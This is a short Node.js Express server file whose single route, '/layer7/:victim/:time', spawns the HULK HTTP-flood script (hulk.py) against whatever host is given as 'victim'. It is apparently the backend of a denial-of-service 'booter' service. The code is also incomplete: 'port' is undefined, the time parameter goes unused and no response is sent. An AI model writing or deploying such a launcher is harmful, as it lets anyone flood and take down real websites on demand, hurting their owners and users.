const express = require('express')
const { spawn } = require('child_process');
const app = express()


app.get('/layer7/:victim/:time', (req, res) => {
        let victim = req.params.victim
        let timelimit = req.params.time
        python = spawn('python2', ['hulk.py', `http://${victim}`]);

})


app.listen(port, () => console.log(`App listening on port
${port}!`))
